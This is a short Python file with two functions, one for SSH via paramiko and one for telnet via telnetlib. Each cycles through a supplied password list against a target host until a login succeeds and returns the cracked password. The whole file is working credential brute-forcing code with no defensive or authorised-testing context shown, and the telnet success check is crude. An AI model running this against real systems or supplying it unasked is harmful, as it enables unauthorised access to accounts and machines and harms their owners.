import paramiko
import telnetlib
import time

def brute_force_ssh(target, username, password_list, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3)
            # If successful
            success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
            results.append({"status": "success", "password": password, "message": success_msg})
            client.close()
            return results # Stop after finding one
        except paramiko.AuthenticationException:
            # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
            pass
        except Exception as e:
            if "Error reading SSH protocol banner" in str(e):
                 # results.append({"status": "error", "password": password, "message": f"Connection Error: {str(e)}"})
                 pass
            else:
                 # results.append({"status": "error", "password": password, "message": f"Error: {str(e)}"})
                 pass
            time.sleep(0.1) # Be nice
            
    client.close()
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

def brute_force_telnet(target, username, password_list, port=23):
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            tn = telnetlib.Telnet(target, port, timeout=3)
            tn.read_until(b"login: ", timeout=2)
            tn.write(username.encode('ascii') + b"\n")
            
            tn.read_until(b"Password: ", timeout=2)
            tn.write(password.encode('ascii') + b"\n")
            
            response = tn.read_some().decode('ascii')
            
            if "Login incorrect" not in response and "failed" not in response:
                 success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                 results.append({"status": "success", "password": password, "message": success_msg})
                 tn.close()
                 return results
            
            tn.close()
            
        except Exception as e:
            # results.append({"status": "error", "message": str(e)})
            pass
            
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results
